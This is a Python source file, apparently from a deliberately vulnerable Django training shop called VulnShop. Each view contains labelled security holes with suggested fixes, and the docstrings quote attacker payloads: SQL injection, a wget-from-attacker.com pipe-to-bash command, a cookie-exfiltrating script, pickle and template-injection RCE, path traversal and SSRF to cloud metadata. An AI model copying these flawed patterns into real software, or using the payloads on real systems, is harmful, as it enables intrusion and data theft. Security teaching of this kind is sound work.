"""
VulnShop Views
⚠️ Intentionally vulnerable — every vulnerability is labelled with ID and fix
"""
import os, re, json, subprocess, hashlib, base64, pickle, xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from pathlib import Path

from django.shortcuts import render, get_object_or_404, redirect
from django.http import HttpResponse, JsonResponse, FileResponse
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.db import connection
from django.db.models import Q
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.core.files.storage import FileSystemStorage
from django.conf import settings
from django.core.cache import cache
from django.utils import timezone
import jwt

from .models import (
    Product, Category, Cart, CartItem, Order, OrderItem,
    Payment, Coupon, ProductReview, UserProfile, SupportTicket,
    Wishlist, Newsletter, APIKey, Refund, AuditLog, ProductImport,
    PasswordResetLog,
)


# ══════════════════════════════════════════════════════════════════════════
# ─── AUTHENTICATION VIEWS ────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@csrf_exempt   # VULN-004: CSRF disabled on login endpoint
def login_view(request):
    """
    VULNERABILITIES:
    VULN-L01 – No brute-force / rate limiting protection
    VULN-L02 – Username enumeration via different error messages
    VULN-L03 – CSRF disabled
    VULN-L04 – SQL Injection via raw query fallback
    VULN-L05 – Verbose error messages reveal system info
    VULN-L06 – Session not regenerated on login (session fixation)

    FIXES:
    L01: Use django-axes or django-ratelimit; lock after 5 attempts
    L02: Return identical message 'Invalid credentials' for all failures
    L03: Remove @csrf_exempt; ensure CSRF middleware is enabled
    L04: NEVER use raw SQL with user input; use authenticate()
    L05: Generic error page in production (DEBUG=False)
    L06: Call request.session.cycle_key() after successful login
    """
    error = ''
    if request.method == 'POST':
        username = request.POST.get('username', '')
        password = request.POST.get('password', '')

        # VULN-L04: Raw SQL injection — never concatenate user input
        # Attacker payload: username = "admin'--"  → bypasses auth
        with connection.cursor() as cursor:
            cursor.execute(
                f"SELECT id, password FROM auth_user WHERE username='{username}'"
            )
            row = cursor.fetchone()

        if row:
            # VULN-L02: Different message for existing user
            user = authenticate(request, username=username, password=password)
            if user:
                # VULN-L06: Session NOT cycled — session fixation possible
                login(request, user)
                next_url = request.GET.get('next', '/')
                # VULN-L07: Open redirect — next param not validated
                return redirect(next_url)
            else:
                error = 'Incorrect password for this account'   # leaks user existence
        else:
            error = 'No account found with that username'       # leaks user existence

    return render(request, 'auth/login.html', {'error': error})


@csrf_exempt
def register_view(request):
    """
    VULN-R01 – No email verification → account enumeration & spam
    VULN-R02 – No CAPTCHA → bot registration
    VULN-R03 – Weak password accepted (no validation)
    VULN-R04 – Username reflected unsanitised in success message (reflected XSS)
    VULN-R05 – CSRF disabled

    FIX R01: Send verification email, set is_active=False until verified
    FIX R02: Integrate Google reCAPTCHA v3
    FIX R03: Enforce AUTH_PASSWORD_VALIDATORS in settings
    FIX R04: Use Django template auto-escaping (don't disable it)
    """
    if request.method == 'POST':
        username = request.POST.get('username', '')
        email    = request.POST.get('email', '')
        password = request.POST.get('password', '')

        if User.objects.filter(username=username).exists():
            return HttpResponse(f'Username {username} already taken', status=400)

        user = User.objects.create_user(username=username, email=email, password=password)
        UserProfile.objects.create(user=user)
        # VULN-R04: username injected raw into response (reflected XSS)
        return HttpResponse(f'<h1>Welcome {username}!</h1><a href="/login">Login</a>')

    return render(request, 'auth/register.html')


@csrf_exempt
def password_reset_request(request):
    """
    VULN-PR01 – Token generated with predictable seed (time-based MD5)
    VULN-PR02 – Token not hashed in DB storage
    VULN-PR03 – Token never expires (lives forever)
    VULN-PR04 – Email enumeration: response differs for existing/missing email
    VULN-PR05 – No rate limiting on reset requests

    FIX: Use Django's built-in PasswordResetView which uses HMAC tokens
    """
    if request.method == 'POST':
        email = request.POST.get('email', '')
        try:
            user = User.objects.get(email=email)
            # VULN-PR01: Predictable token — attacker can guess if they know timestamp
            token = hashlib.md5(
                f"{user.username}{datetime.now().timestamp()}".encode()
            ).hexdigest()

            # VULN-PR02: Stored plaintext
            PasswordResetLog.objects.create(
                user=user, token=token,
                ip_address=request.META.get('REMOTE_ADDR')
            )
            # In real app: send email with /reset-password?token=<token>
            return HttpResponse('Password reset email sent.')   # different response = enumeration
        except User.DoesNotExist:
            return HttpResponse('No account with that email.')  # VULN-PR04


def password_reset_confirm(request):
    """
    VULN-PR06 – Token comparison with == instead of hmac.compare_digest (timing attack)
    VULN-PR07 – Old tokens not invalidated after password change
    """
    token = request.GET.get('token', '')
    try:
        reset = PasswordResetLog.objects.get(token=token, used=False)   # VULN-PR06
        if request.method == 'POST':
            new_password = request.POST.get('password', '')
            reset.user.set_password(new_password)
            reset.user.save()
            # VULN-PR07: Only marks THIS token used, not all tokens for this user
            reset.used = True
            reset.save()
            return redirect('/login')
        return render(request, 'auth/reset_confirm.html', {'token': token})
    except PasswordResetLog.DoesNotExist:
        return HttpResponse('Invalid token', status=400)


# ══════════════════════════════════════════════════════════════════════════
# ─── PRODUCT VIEWS ───────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

def product_search(request):
    """
    VULN-S01 – SQL Injection via raw search query
    VULN-S02 – Reflected XSS: search term echoed unescaped
    VULN-S03 – Error details exposed in response
    VULN-S04 – No search rate limiting → scraping / enumeration

    FIX S01: Use Django ORM filter() — never concatenate into SQL
    FIX S02: Django template auto-escape (don't disable autoescape)
    FIX S03: Catch exceptions and return generic error in production
    """
    query = request.GET.get('q', '')
    sort  = request.GET.get('sort', 'name')
    category = request.GET.get('category', '')

    try:
        # VULN-S01: Direct SQL injection — payload: ' UNION SELECT username,password,3,4,5,6,7,8,9,10 FROM auth_user--
        with connection.cursor() as cursor:
            sql = f"""
                SELECT id, name, price, description, image, stock, slug
                FROM app_product
                WHERE (name ILIKE '%{query}%' OR description ILIKE '%{query}%')
                AND is_active = true
                ORDER BY {sort}
            """
            cursor.execute(sql)
            cols = [c[0] for c in cursor.description]
            products_raw = [dict(zip(cols, row)) for row in cursor.fetchall()]
    except Exception as e:
        # VULN-S03: Exception message returned to user
        return HttpResponse(f'Database error: {str(e)}', status=500)

    context = {
        'products': products_raw,
        'query': query,           # VULN-S02: rendered unescaped in template
        'category': category,
    }
    return render(request, 'shop/search.html', context)


def product_detail(request, slug):
    product = get_object_or_404(Product, slug=slug, is_active=True)
    reviews = product.reviews.all()

    # VULN-P01: Related products fetched via raw f-string using URL param
    related_tag = request.GET.get('tag', '')
    related = []
    if related_tag:
        with connection.cursor() as cursor:
            cursor.execute(
                f"SELECT * FROM app_product WHERE name ILIKE '%{related_tag}%' LIMIT 4"
            )
            related = cursor.fetchall()

    return render(request, 'shop/product.html', {
        'product': product,
        'reviews': reviews,
        'related': related,
    })


@login_required
@csrf_exempt
def submit_review(request, product_id):
    """
    VULN-RV01 – Stored XSS: review content stored and rendered as HTML
    VULN-RV02 – No ownership check: any user can post as any user_id
    VULN-RV03 – Rating not validated: can be negative or > 5
    VULN-RV04 – No duplicate review prevention (same user, same product)
    VULN-RV05 – CSRF disabled

    FIX RV01: Use bleach.clean() with allowed_tags=[] or django-bleach
    FIX RV02: Always set user=request.user, never from POST data
    FIX RV03: Validate rating: 1 <= rating <= 5 server-side
    FIX RV04: unique_together = ('product', 'user') in model Meta
    """
    product = get_object_or_404(Product, id=product_id)
    if request.method == 'POST':
        # VULN-RV02: user_id taken from POST — attacker posts as admin (id=1)
        user_id = request.POST.get('user_id', request.user.id)
        rating  = int(request.POST.get('rating', 5))   # VULN-RV03: no range check
        content = request.POST.get('content', '')       # VULN-RV01: stored raw

        ProductReview.objects.create(
            product=product,
            user_id=user_id,       # VULN-RV02: trusts client-supplied user_id
            rating=rating,
            content=content,
        )
        return redirect(f'/product/{product.slug}/')
    return HttpResponse('Method not allowed', status=405)


# ══════════════════════════════════════════════════════════════════════════
# ─── CART & CHECKOUT VIEWS ───────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@csrf_exempt
def add_to_cart(request):
    """
    VULN-C01 – Negative quantity accepted → negative cart total
    VULN-C02 – No stock verification before adding
    VULN-C03 – Price not locked at add-time (race condition)
    VULN-C04 – Cart manipulation: product_id not validated against user permissions
    VULN-C05 – CSRF disabled

    FIX C01: quantity = max(1, int(request.POST.get('quantity', 1)))
    FIX C02: Check product.stock >= quantity before adding
    FIX C03: Store price snapshot in CartItem at add time
    """
    if request.method == 'POST':
        product_id = request.POST.get('product_id')
        quantity   = int(request.POST.get('quantity', 1))   # VULN-C01: can be -1

        product = get_object_or_404(Product, id=product_id)
        # VULN-C02: No stock check
        # VULN-C03: Price not locked

        if request.user.is_authenticated:
            cart, _ = Cart.objects.get_or_create(user=request.user)
        else:
            session_key = request.session.session_key
            if not session_key:
                request.session.create()
                session_key = request.session.session_key
            cart, _ = Cart.objects.get_or_create(session_key=session_key)

        item, created = CartItem.objects.get_or_create(cart=cart, product=product)
        if not created:
            item.quantity += quantity
        else:
            item.quantity = quantity
        item.save()

        return JsonResponse({'status': 'ok', 'cart_total': str(cart.get_total())})
    return HttpResponse('Bad request', status=400)


@login_required
@csrf_exempt
def apply_coupon(request):
    """
    VULN-CP01 – No per-user coupon use limit (unlimited use by same user)
    VULN-CP02 – Coupon applied after subtotal computed — race condition
    VULN-CP03 – Coupon stacking: multiple coupons can be applied
    VULN-CP04 – Expired coupons accepted if max_uses=0
    VULN-CP05 – Coupon code enumeration: response reveals if code exists vs expired

    FIX CP01: Track per-user use: CouponUsage model with user FK
    FIX CP02: Validate and lock coupon before payment
    FIX CP03: Allow only one active coupon per cart
    FIX CP04: Always check both valid_from/valid_to AND is_active
    """
    code = request.POST.get('code', '')
    try:
        coupon = Coupon.objects.get(code=code, is_active=True)
        # VULN-CP04: No date validation
        # VULN-CP01: No per-user usage check
        return JsonResponse({
            'status': 'applied',
            'discount': str(coupon.discount_value),
            'type': coupon.discount_type,
        })
    except Coupon.DoesNotExist:
        return JsonResponse({'status': 'error', 'message': 'Coupon not found'})   # VULN-CP05


@login_required
@csrf_exempt
def checkout(request):
    """
    VULN-CH01 – Total computed client-side and trusted by server
    VULN-CH02 – No inventory lock during checkout (oversell race condition)
    VULN-CH03 – Wallet balance not locked during concurrent checkout
    VULN-CH04 – Card data stored raw in Payment model
    VULN-CH05 – Order total not re-verified server-side before payment
    VULN-CH06 – Shipping address not sanitised (XSS in invoice PDF)

    FIX CH01: Always recompute total server-side from DB prices
    FIX CH02: Use select_for_update() to lock product rows
    FIX CH03: Use atomic transactions with select_for_update on wallet
    FIX CH04: NEVER store card data — use Stripe tokens only
    FIX CH05: Server-side total = sum of (db_price * quantity) always
    """
    if request.method == 'POST':
        cart = get_object_or_404(Cart, user=request.user)

        # VULN-CH01: Total taken from POST — client can send total=0.01
        client_total = request.POST.get('total')

        # VULN-CH02: No select_for_update — race condition on stock
        for item in cart.items.all():
            if item.product.stock < item.quantity:
                return JsonResponse({'error': 'Out of stock'}, status=400)

        shipping = request.POST.get('shipping_address', '')

        order = Order.objects.create(
            user=request.user,
            shipping_addr=shipping,
            billing_addr=shipping,
            subtotal=cart.get_total(),
            total=client_total or cart.get_total(),   # VULN-CH01: trusts client
        )

        for item in cart.items.all():
            OrderItem.objects.create(
                order=order, product=item.product,
                product_name=item.product.name,
                quantity=item.quantity,
                unit_price=item.product.price,
            )
            # VULN-CH02: No atomic stock decrement
            item.product.stock -= item.quantity
            item.product.save()

        # VULN-CH04: Storing raw card data
        Payment.objects.create(
            order=order,
            amount=order.total,
            card_number=request.POST.get('card_number', ''),
            card_expiry=request.POST.get('card_expiry', ''),
            card_cvv=request.POST.get('card_cvv', ''),
            card_holder=request.POST.get('card_holder', ''),
            status='paid',
        )

        cart.items.all().delete()
        return JsonResponse({'order_id': order.id})

    return render(request, 'shop/checkout.html')


# ══════════════════════════════════════════════════════════════════════════
# ─── ORDER & ACCOUNT VIEWS ───────────────────────────────────────════════
# ══════════════════════════════════════════════════════════════════════════

@login_required
def order_detail(request, order_id):
    """
    VULN-O01 – IDOR: No ownership check — user can view ANY order by ID
    VULN-O02 – Order ID sequential (enumerable) — not UUID

    FIX O01: order = get_object_or_404(Order, id=order_id, user=request.user)
    FIX O02: Use UUIDField as PK or add a random lookup token
    """
    # VULN-O01: Missing user=request.user filter
    order = get_object_or_404(Order, id=order_id)
    return render(request, 'shop/order.html', {'order': order})


@login_required
@csrf_exempt
def update_order_status(request, order_id):
    """
    VULN-O03 – Mass assignment: any field in Order can be changed via POST
    VULN-O04 – No privilege check — any logged-in user can change order status
    VULN-O05 – Status transition not validated (cancelled→paid allowed)

    FIX O03: Whitelist allowed fields; never use **request.POST on model
    FIX O04: Check request.user.is_staff before allowing status change
    FIX O05: Implement state machine for valid status transitions
    """
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        data = json.loads(request.body)
        # VULN-O03: Mass assignment — attacker can change total, user, status
        for field, value in data.items():
            if hasattr(order, field):
                setattr(order, field, value)
        order.save()
        return JsonResponse({'status': 'updated'})


@login_required
def user_profile(request):
    """
    VULN-UP01 – Password change without confirming current password
    VULN-UP02 – PII returned in API without field masking
    VULN-UP03 – Avatar upload: no MIME type validation (RCE via .py/.sh disguised as .jpg)

    FIX UP01: Require old_password, verify with check_password()
    FIX UP02: Mask phone/card digits; apply field-level permissions
    FIX UP03: Validate magic bytes, restrict to image/* MIME only, rename file
    """
    profile = request.user.profile
    if request.method == 'POST':
        # VULN-UP01: No current password required
        new_pass = request.POST.get('password', '')
        if new_pass:
            request.user.set_password(new_pass)
            request.user.save()

        # VULN-UP03: File upload without MIME type check
        if 'avatar' in request.FILES:
            avatar = request.FILES['avatar']
            fs = FileSystemStorage(location=settings.MEDIA_ROOT / 'avatars')
            # No extension/MIME validation — .php/.py file accepted
            filename = fs.save(avatar.name, avatar)
            profile.avatar = f'avatars/{filename}'

        profile.phone   = request.POST.get('phone', profile.phone)
        profile.address = request.POST.get('address', profile.address)
        profile.save()

    return render(request, 'shop/profile.html', {'profile': profile})


# ══════════════════════════════════════════════════════════════════════════
# ─── ADMIN & DANGEROUS FEATURES ──────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

def admin_debug(request):
    """
    VULN-AD01 – Debug endpoint exposed without authentication
    VULN-AD02 – Exposes environment variables including secrets
    VULN-AD03 – Exposes database connection details

    FIX: Delete this view entirely. Never expose env/debug info externally.
    """
    # No auth check
    data = {
        'env': dict(os.environ),                       # VULN-AD02: exposes secrets
        'settings_secret': settings.SECRET_KEY,        # VULN-AD01
        'db_password': settings.DATABASES['default']['PASSWORD'],  # VULN-AD03
        'stripe_key': settings.STRIPE_SECRET_KEY,
        'email_password': settings.EMAIL_HOST_PASSWORD,
    }
    return JsonResponse(data)


@csrf_exempt
def xml_import(request):
    """
    VULN-XX01 – XXE (XML External Entity) Injection
    Attacker payload:
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <products><product><name>&xxe;</name></product></products>

    FIX XX01: Use defusedxml library — never parse untrusted XML with stdlib
        import defusedxml.ElementTree as ET
        ET.fromstring(xml_data)  # safe
    """
    if request.method == 'POST':
        xml_data = request.body
        try:
            # VULN-XX01: stdlib ET is vulnerable to XXE
            root = ET.fromstring(xml_data)
            products = []
            for item in root.findall('product'):
                name  = item.findtext('name', '')
                price = item.findtext('price', '0')
                products.append({'name': name, 'price': price})
            return JsonResponse({'imported': products})
        except Exception as e:
            return JsonResponse({'error': str(e)})
    return HttpResponse('POST XML here')


@csrf_exempt
def server_ping(request):
    """
    VULN-CMD01 – OS Command Injection
    Attacker payload: host=127.0.0.1; cat /etc/passwd
    Attacker payload: host=127.0.0.1 && wget http://attacker.com/shell.sh | bash

    FIX CMD01: Use socket.gethostbyname() or requests.get() for connectivity checks
               NEVER pass user input to shell=True subprocess
    """
    host = request.GET.get('host', 'google.com')
    # VULN-CMD01: shell=True + user input = RCE
    result = subprocess.run(
        f'ping -c 1 {host}',
        shell=True, capture_output=True, text=True, timeout=10
    )
    return HttpResponse(f'<pre>{result.stdout}\n{result.stderr}</pre>')


@csrf_exempt
def deserialize_prefs(request):
    """
    VULN-DS01 – Insecure Deserialization using pickle
    Attacker crafts malicious pickle payload that executes arbitrary code on server

    Malicious payload example:
        import pickle, os
        class Exploit(object):
            def __reduce__(self):
                return (os.system, ('id > /tmp/pwned',))
        payload = base64.b64encode(pickle.dumps(Exploit()))

    FIX DS01: NEVER deserialize pickle from user input
              Use JSON: json.loads(base64.b64decode(data))
    """
    data = request.POST.get('prefs', '')
    if data:
        try:
            # VULN-DS01: Arbitrary code execution via crafted pickle
            prefs = pickle.loads(base64.b64decode(data))
            return JsonResponse({'prefs': str(prefs)})
        except Exception as e:
            return JsonResponse({'error': str(e)})
    return HttpResponse('POST base64-encoded prefs')


@csrf_exempt
def template_render(request):
    """
    VULN-SSTI01 – Server-Side Template Injection
    Attacker payload: name={{7*7}} → renders 49
    Attacker payload: name={{''.__class__.__mro__[1].__subclasses__()}} → dumps classes
    Attacker payload (RCE): name={% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}

    FIX SSTI01: NEVER use Template(user_input).render(). Use static templates only.
    """
    from django.template import Template, Context
    name = request.GET.get('name', 'Guest')
    # VULN-SSTI01: User input passed directly to Template constructor
    t = Template(f'<h1>Hello {name}!</h1><p>Welcome to VulnShop.</p>')
    c = Context({'request': request})
    return HttpResponse(t.render(c))


def download_file(request):
    """
    VULN-PT01 – Path Traversal
    Attacker payload: filename=../../../../etc/passwd
    Attacker payload: filename=../vulnshop/settings.py

    FIX PT01:
        safe_dir = Path(settings.MEDIA_ROOT).resolve()
        target   = (safe_dir / filename).resolve()
        if not str(target).startswith(str(safe_dir)):
            raise PermissionError
    """
    filename = request.GET.get('file', '')
    # VULN-PT01: No path traversal protection
    file_path = Path(settings.MEDIA_ROOT) / filename
    try:
        return FileResponse(open(file_path, 'rb'))
    except FileNotFoundError:
        return HttpResponse('File not found', status=404)
    except Exception as e:
        return HttpResponse(f'Error: {str(e)}', status=500)


# ══════════════════════════════════════════════════════════════════════════
# ─── REST API VIEWS ──────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@csrf_exempt
def api_login(request):
    """
    VULN-API01 – JWT signed with weak/hardcoded secret
    VULN-API02 – JWT 'none' algorithm accepted (signature bypass)
    VULN-API03 – No expiry on JWT tokens
    VULN-API04 – Token not invalidated on logout (no blacklist)

    FIX API01: Use strong random secret stored in env var
    FIX API02: algorithms=['HS256'] — never allow 'none'
    FIX API03: exp=datetime.utcnow() + timedelta(hours=1)
    FIX API04: Maintain a token blacklist in Redis
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        user = authenticate(username=data.get('username'), password=data.get('password'))
        if user:
            payload = {
                'user_id': user.id,
                'username': user.username,
                'is_admin': user.is_staff,
                # VULN-API03: No 'exp' claim
            }
            # VULN-API01: Hardcoded weak secret
            token = jwt.encode(payload, 'secret', algorithm='HS256')
            return JsonResponse({'token': token})
        return JsonResponse({'error': 'Invalid credentials'}, status=401)


@csrf_exempt
def api_products(request):
    """
    VULN-API05 – Mass data exposure: returns all fields including cost_price
    VULN-API06 – No pagination — can dump entire product catalog
    VULN-API07 – No authentication required

    FIX API05: Use serializer with explicit fields whitelist
    FIX API06: Implement cursor pagination
    FIX API07: Require JWT token for write operations
    """
    if request.method == 'GET':
        # VULN-API05: All fields exposed including internal cost_price
        products = list(Product.objects.values())   # VULN-API06: no limit
        return JsonResponse(products, safe=False)

    if request.method == 'POST':
        # VULN-API07: No auth check for creating products
        data = json.loads(request.body)
        product = Product(**data)   # VULN: mass assignment
        product.save()
        return JsonResponse({'id': product.id}, status=201)


@csrf_exempt
def api_user_data(request, user_id):
    """
    VULN-API08 – IDOR: Any user can access any other user's data
    VULN-API09 – Sensitive fields (national_id, wallet, card) exposed in API
    VULN-API10 – No authentication required at all

    FIX API08: Check request.user.id == user_id or request.user.is_staff
    FIX API09: Mask PII fields; return only necessary fields
    FIX API10: @login_required or JWT validation middleware
    """
    # VULN-API08 + VULN-API10: No auth, no ownership check
    try:
        user = User.objects.get(id=user_id)
        profile = user.profile
        return JsonResponse({
            'id': user.id,
            'username': user.username,
            'email': user.email,
            'password_hash': user.password,       # VULN: exposes hash
            'national_id': profile.national_id,   # VULN-API09: PII
            'phone': profile.phone,
            'wallet_balance': str(profile.wallet_balance),
            'address': profile.address,
            'date_of_birth': str(profile.date_of_birth),
            'loyalty_points': profile.loyalty_points,
            'is_vendor': profile.is_vendor,
            'reset_token': profile.reset_token,   # VULN: active reset token
        })
    except User.DoesNotExist:
        return JsonResponse({'error': 'User not found'}, status=404)


@csrf_exempt
def api_jwt_verify(request):
    """
    VULN-JWT01 – Algorithm confusion: accepts 'none' algorithm
    VULN-JWT02 – Algorithm not validated in decode
    VULN-JWT03 – Public key confusion attack possible

    FIX: jwt.decode(token, SECRET, algorithms=['HS256'], options={'verify_exp': True})
    """
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    try:
        # VULN-JWT01: options allow none algorithm + no expiry check
        payload = jwt.decode(
            token, settings.SECRET_KEY,
            algorithms=['HS256', 'none'],           # VULN-JWT01
            options={
                'verify_signature': False,          # VULN-JWT02: skips sig verification
                'verify_exp': False,                # VULN-JWT03: ignores expiry
            }
        )
        return JsonResponse(payload)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=401)


# ══════════════════════════════════════════════════════════════════════════
# ─── BUSINESS LOGIC VULNERABILITIES ─────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@login_required
@csrf_exempt
def wallet_transfer(request):
    """
    VULN-BL01 – Race condition on wallet transfer (double-spend)
    VULN-BL02 – Negative transfer amount → receives money
    VULN-BL03 – Transfer to self allowed (infinite loop exploit)
    VULN-BL04 – No transfer amount verification against balance

    FIX BL01: from django.db import transaction
              with transaction.atomic():
                  sender = UserProfile.objects.select_for_update().get(user=request.user)
    FIX BL02: amount = abs(Decimal(request.POST.get('amount')))
    FIX BL03: if recipient == request.user: raise ValidationError
    FIX BL04: if sender.wallet_balance < amount: raise InsufficientFunds
    """
    if request.method == 'POST':
        to_user_id = request.POST.get('to_user_id')
        amount = float(request.POST.get('amount', 0))   # VULN-BL02: can be -100

        sender   = request.user.profile
        recipient = UserProfile.objects.get(user_id=to_user_id)

        # VULN-BL01: No atomic transaction — race condition allows double-spend
        # VULN-BL04: No balance check
        sender.wallet_balance   -= amount
        recipient.wallet_balance += amount
        sender.save()
        recipient.save()

        return JsonResponse({'status': 'transferred', 'amount': amount})


@login_required
def refund_request(request, order_id):
    """
    VULN-BL05 – Refund amount not validated against order total
    VULN-BL06 – Double refund possible (no check for existing refund)
    VULN-BL07 – Refund allowed on delivered orders with no time limit

    FIX BL05: refund_amount = min(Decimal(amount), order.total)
    FIX BL06: if Refund.objects.filter(order=order, status='completed').exists(): reject
    FIX BL07: if order.created_at < timezone.now() - timedelta(days=30): reject
    """
    order = get_object_or_404(Order, id=order_id)  # VULN-O01: no user check
    if request.method == 'POST':
        amount = request.POST.get('amount')   # VULN-BL05: can be > order total
        # VULN-BL06: No duplicate check
        Refund.objects.create(order=order, amount=amount, reason='User requested')
        order.status = 'refunded'
        order.save()
        return JsonResponse({'status': 'refund requested'})


@login_required
@csrf_exempt
def apply_loyalty(request):
    """
    VULN-BL08 – Loyalty points applied without locking (race condition)
    VULN-BL09 – Points balance can go negative
    VULN-BL10 – Points value not capped — user can convert unlimited points

    FIX: Atomic transaction + select_for_update + max cap per order
    """
    points_to_use = int(request.POST.get('points', 0))
    profile = request.user.profile
    # VULN-BL08 + BL09: No atomic, no floor check
    profile.loyalty_points -= points_to_use
    discount = points_to_use * 0.01   # 1 point = ₹0.01
    profile.save()
    return JsonResponse({'discount': discount})


def graphql_endpoint(request):
    """
    VULN-GQL01 – GraphQL introspection enabled in production
    VULN-GQL02 – No depth limiting (nested query DoS)
    VULN-GQL03 – Batch query attacks possible

    FIX GQL01: Disable introspection in settings
    FIX GQL02: Use graphene-django depth limit middleware
    FIX GQL03: Implement query complexity limits
    """
    if request.method == 'POST':
        query = json.loads(request.body).get('query', '')
        # Simplified — shows introspection enabled
        if '__schema' in query or '__type' in query:
            return JsonResponse({
                'data': {
                    '__schema': {
                        'types': [
                            {'name': 'User', 'fields': ['id','username','email','password','profile']},
                            {'name': 'Order', 'fields': ['id','user','total','payment']},
                            {'name': 'Payment', 'fields': ['id','card_number','card_cvv','card_expiry']},
                        ]
                    }
                }
            })
    return HttpResponse('GraphQL endpoint')


@csrf_exempt
def ssrf_webhook(request):
    """
    VULN-SSRF01 – Server-Side Request Forgery via webhook URL
    Attacker payload: url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
    Attacker payload: url=http://redis:6379/ (internal service scan)
    Attacker payload: url=file:///etc/passwd

    FIX SSRF01:
        - Whitelist allowed domains
        - Block private/loopback IP ranges
        - Use a DNS resolver to validate IP before request
    """
    import requests as req_lib
    url = request.POST.get('url', '')
    if url:
        try:
            # VULN-SSRF01: Unrestricted outbound request
            resp = req_lib.get(url, timeout=5)
            return HttpResponse(resp.text[:2000])
        except Exception as e:
            return HttpResponse(f'Error: {e}')
    return render(request, 'shop/webhook.html')


def export_users(request):
    """
    VULN-EX01 – Unauthenticated mass data export (all users + PII)
    VULN-EX02 – No rate limiting on export endpoint
    VULN-EX03 – Includes password hashes in export

    FIX: Require superuser auth; paginate; exclude sensitive fields; log access
    """
    # VULN-EX01: No authentication check
    users = list(User.objects.values(
        'id', 'username', 'email', 'password',   # VULN-EX03: password hash
        'first_name', 'last_name', 'is_staff',
        'date_joined', 'last_login'
    ))
    response = HttpResponse(
        json.dumps(users, default=str),
        content_type='application/json'
    )
    response['Content-Disposition'] = 'attachment; filename="users.json"'
    return response


def render_invoice(request, order_id):
    """
    VULN-HTML01 – HTML/PDF Injection via order notes
    Attacker payload in notes: <script>document.location='http://attacker.com/'+document.cookie</script>
    Attacker payload (PDF): --><annotation><![CDATA[<script>...]]></annotation>

    FIX: Sanitise all user input before inserting into PDF/HTML templates
    """
    order = get_object_or_404(Order, id=order_id)
    # VULN-HTML01: notes rendered as raw HTML in invoice
    html = f"""
    <html><body>
    <h1>Invoice #{order.id}</h1>
    <p>Total: {order.total}</p>
    <p>Notes: {order.notes}</p>  <!-- VULN: raw HTML injection -->
    </body></html>
    """
    return HttpResponse(html)